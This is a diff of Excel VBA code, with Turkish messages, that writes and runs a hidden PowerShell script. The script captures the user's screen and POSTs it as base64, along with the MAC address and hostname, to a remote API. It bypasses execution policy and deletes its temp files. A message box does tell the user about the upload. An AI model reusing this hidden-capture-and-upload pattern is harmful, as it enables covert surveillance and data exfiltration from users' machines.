@@ -1,21 +1,3 @@
-Private Function EscJson(s As String) As String
-    Dim i As Long, c As String, out As String, ac As Long
-    out = ""
-    For i = 1 To Len(s)
-        c = Mid$(s, i, 1)
-        ac = AscW(c)
-        Select Case ac
-            Case 92:  out = out & Chr(92) & Chr(92)
-            Case 34:  out = out & Chr(92) & Chr(34)
-            Case 10:  out = out & Chr(92) & "n"
-            Case 13:  ' atla
-            Case 9:   out = out & Chr(92) & "t"
-            Case Else: out = out & c
-        End Select
-    Next i
-    EscJson = out
-End Function
-
 Private Function PsQuote(s As String) As String
     PsQuote = Replace(s, "'", "''")
 End Function
@@ -39,8 +21,7 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
         On Error Resume Next
         Dim objWMINet As Object, colNet As Object, objNet As Object
         Set objWMINet = GetObject("winmgmts:\\.\root\cimv2")
-        Set colNet = objWMINet.ExecQuery( _
-            "SELECT MACAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
+        Set colNet = objWMINet.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
         For Each objNet In colNet
             If objNet.MACAddress <> "" Then mac = objNet.MACAddress : Exit For
         Next
@@ -53,74 +34,106 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
         Exit Function
     End If
 
-    Dim psCmd As String
-    psCmd = "$ErrorActionPreference='Stop';" & _
-        "$api='" & PsQuote(apiBase) & "';" & _
-        "$mac='" & PsQuote(mac) & "';" & _
-        "$hn='" & PsQuote(hostname) & "';" & _
-        "$firma='" & PsQuote(firmaAdi) & "';" & _
-        "Add-Type -AssemblyName System.Windows.Forms;" & _
-        "Add-Type -AssemblyName System.Drawing;" & _
-        "$scr=[Windows.Forms.Screen]::PrimaryScreen;" & _
-        "$bmp=New-Object Drawing.Bitmap $scr.Bounds.Width,$scr.Bounds.Height;" & _
-        "$g=[Drawing.Graphics]::FromImage($bmp);" & _
-        "$g.CopyFromScreen($scr.Bounds.Location,[Drawing.Point]::Empty,$bmp.Size);" & _
-        "$g.Dispose();" & _
-        "$maxW=1280;" & _
-        "if($bmp.Width -gt $maxW){" & _
-        "$ratio=$maxW/$bmp.Width;" & _
-        "$nh=[int]($bmp.Height*$ratio);" & _
-        "$resized=New-Object Drawing.Bitmap $maxW,$nh;" & _
-        "$gr=[Drawing.Graphics]::FromImage($resized);" & _
-        "$gr.InterpolationMode=[Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic;" & _
-        "$gr.DrawImage($bmp,0,0,$maxW,$nh);" & _
-        "$gr.Dispose();$bmp.Dispose();$bmp=$resized};" & _
-        "$ms=New-Object IO.MemoryStream;" & _
-        "$enc=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{$_.MimeType -eq 'image/jpeg'};" & _
-        "$ep=New-Object Drawing.Imaging.EncoderParameters 1;" & _
-        "$ep.Param[0]=New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality,65L);" & _
-        "$bmp.Save($ms,$enc,[ref]$ep);" & _
-        "$bmp.Dispose();" & _
-        "$b64=[Convert]::ToBase64String($ms.ToArray());" & _
-        "$ms.Dispose();" & _
-        "$body=@{mac=$mac;moduleName='CaptureScreenshot';hostname=$hn;firmaAdi=$firma;" & _
-        "output=@{type='screenshot';mimeType='image/jpeg';imageBase64=$b64}}|" & _
-        "ConvertTo-Json -Depth 5 -Compress;" & _
-        "$r=Invoke-RestMethod -Uri ($api+'module-output/') -Method POST -Body $body -ContentType 'application/json; charset=utf-8';" & _
-        "Write-Output 'OK'"
-
     Dim result As String
-    result = RunPS(psCmd)
+    result = RunCaptureScript(apiBase, mac, hostname, firmaAdi)
 
     If InStr(1, result, "OK", vbTextCompare) > 0 Then
         MsgBox "Ekran goruntusu sunucuya gonderildi." & Chr(10) & _
                "Web: Modul Ciktilari > Ekran Goruntuleri", vbInformation, "CaptureScreenshot"
     Else
-        MsgBox "Ekran goruntusu gonderilemedi." & Chr(10) & Left(result, 200), vbExclamation, "CaptureScreenshot"
+        MsgBox "Ekran goruntusu gonderilemedi." & Chr(10) & Left(result, 300), vbExclamation, "CaptureScreenshot"
     End If
 
     Set DynamicFunc = Nothing
 End Function
 
-'=== ORTAK YARDIMCILAR ===
+' PowerShell betigini satir satir dosyaya yazar (VBA 25 satir devam limiti yok)
+Private Function RunCaptureScript(apiBase As String, mac As String, hostname As String, firmaAdi As String) As String
+    Dim psPath As String
+    Dim outPath As String
+    Dim fNum As Integer
+    psPath = Environ("TEMP") & "\__capture_screenshot.ps1"
+    outPath = Environ("TEMP") & "\__capture_screenshot_out.txt"
 
-Private Function RunPS(cmd As String) As String
-    Dim psPath  As String : psPath  = Environ("TEMP") & "\__rps.ps1"
-    Dim outPath As String : outPath = Environ("TEMP") & "\__rps_out.txt"
-    Dim fNum As Integer : fNum = FreeFile
+    On Error Resume Next
+    Kill outPath
+    On Error GoTo 0
+
+    fNum = FreeFile
     Open psPath For Output As #fNum
-        Print #fNum, cmd & " | Out-File -FilePath '" & outPath & "' -Encoding UTF8 -Force"
+    Print #fNum, "$ErrorActionPreference = 'Stop'"
+    Print #fNum, "$api = '" & PsQuote(apiBase) & "'"
+    Print #fNum, "$mac = '" & PsQuote(mac) & "'"
+    Print #fNum, "$hn = '" & PsQuote(hostname) & "'"
+    Print #fNum, "$firma = '" & PsQuote(firmaAdi) & "'"
+    Print #fNum, "$outFile = '" & PsQuote(outPath) & "'"
+    Print #fNum, "try {"
+    Print #fNum, "  Add-Type -AssemblyName System.Windows.Forms"
+    Print #fNum, "  Add-Type -AssemblyName System.Drawing"
+    Print #fNum, "  $scr = [Windows.Forms.Screen]::PrimaryScreen"
+    Print #fNum, "  $bmp = New-Object Drawing.Bitmap $scr.Bounds.Width, $scr.Bounds.Height"
+    Print #fNum, "  $g = [Drawing.Graphics]::FromImage($bmp)"
+    Print #fNum, "  $g.CopyFromScreen($scr.Bounds.Location, [Drawing.Point]::Empty, $bmp.Size)"
+    Print #fNum, "  $g.Dispose()"
+    Print #fNum, "  $maxW = 1280"
+    Print #fNum, "  if ($bmp.Width -gt $maxW) {"
+    Print #fNum, "    $ratio = $maxW / $bmp.Width"
+    Print #fNum, "    $nh = [int]($bmp.Height * $ratio)"
+    Print #fNum, "    $resized = New-Object Drawing.Bitmap $maxW, $nh"
+    Print #fNum, "    $gr = [Drawing.Graphics]::FromImage($resized)"
+    Print #fNum, "    $gr.InterpolationMode = [Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic"
+    Print #fNum, "    $gr.DrawImage($bmp, 0, 0, $maxW, $nh)"
+    Print #fNum, "    $gr.Dispose()"
+    Print #fNum, "    $bmp.Dispose()"
+    Print #fNum, "    $bmp = $resized"
+    Print #fNum, "  }"
+    Print #fNum, "  $ms = New-Object IO.MemoryStream"
+    Print #fNum, "  $enc = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }"
+    Print #fNum, "  $ep = New-Object Drawing.Imaging.EncoderParameters 1"
+    Print #fNum, "  $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality, 65L)"
+    Print #fNum, "  $bmp.Save($ms, $enc, [ref]$ep)"
+    Print #fNum, "  $bmp.Dispose()"
+    Print #fNum, "  $b64 = [Convert]::ToBase64String($ms.ToArray())"
+    Print #fNum, "  $ms.Dispose()"
+    Print #fNum, "  $body = @{"
+    Print #fNum, "    mac = $mac"
+    Print #fNum, "    moduleName = 'CaptureScreenshot'"
+    Print #fNum, "    hostname = $hn"
+    Print #fNum, "    firmaAdi = $firma"
+    Print #fNum, "    output = @{"
+    Print #fNum, "      type = 'screenshot'"
+    Print #fNum, "      mimeType = 'image/jpeg'"
+    Print #fNum, "      imageBase64 = $b64"
+    Print #fNum, "    }"
+    Print #fNum, "  } | ConvertTo-Json -Depth 5 -Compress"
+    Print #fNum, "  Invoke-RestMethod -Uri ($api + 'module-output/') -Method POST -Body $body -ContentType 'application/json; charset=utf-8' | Out-Null"
+    Print #fNum, "  'OK' | Out-File -FilePath $outFile -Encoding UTF8 -Force"
+    Print #fNum, "} catch {"
+    Print #fNum, "  $_.Exception.Message | Out-File -FilePath $outFile -Encoding UTF8 -Force"
+    Print #fNum, "}"
     Close #fNum
-    Dim sh As Object : Set sh = CreateObject("WScript.Shell")
-    sh.Run "powershell -NonInteractive -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
+
+    Dim sh As Object
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
+
     Dim result As String
+    result = ""
     If Dir(outPath) <> "" Then
         fNum = FreeFile
         Open outPath For Input As #fNum
         Dim line As String
-        Do While Not EOF(fNum) : Line Input #fNum, line : result = result & line & vbCrLf : Loop
+        Do While Not EOF(fNum)
+            Line Input #fNum, line
+            result = result & line & vbCrLf
+        Loop
         Close #fNum
-        On Error Resume Next : Kill outPath : Kill psPath : On Error GoTo 0
     End If
-    RunPS = Trim(result)
+
+    On Error Resume Next
+    Kill outPath
+    Kill psPath
+    On Error GoTo 0
+
+    RunCaptureScript = Trim(result)
 End Function
